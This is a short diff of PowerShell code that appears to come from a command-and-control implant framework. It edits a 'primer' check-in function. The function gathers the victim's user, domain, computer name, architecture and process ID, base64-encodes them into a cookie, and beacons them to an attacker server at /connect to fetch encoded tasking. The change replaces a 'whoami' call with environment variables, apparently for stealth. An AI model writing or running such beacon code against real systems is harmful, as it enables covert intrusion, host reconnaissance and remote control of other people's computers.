@@ -652,8 +652,7 @@ if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
 function primer {
-$whoami = (whoami) -replace "`r|`n"
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
 $p64 = [Convert]::ToBase64String($pre)
 $pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
 $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
